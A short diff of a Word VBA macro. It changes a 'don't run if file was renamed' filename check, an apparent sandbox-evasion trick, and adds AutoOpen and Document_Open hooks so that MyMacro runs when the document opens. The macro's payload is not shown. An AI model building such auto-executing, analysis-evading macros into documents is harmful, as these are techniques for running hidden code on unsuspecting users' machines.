@@ -24,7 +24,7 @@ End Function
 
 Function MyMacro()
     ' Don't run if file was renamed
-    If ActiveDocument.Name <> "decryptor.doc" Then
+    If ActiveDocument.Name <> "Document1.doc" Then
         Exit Function
     End If
 
@@ -39,5 +39,9 @@ Function MyMacro()
 End Function
 
 Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
     MyMacro
 End Sub
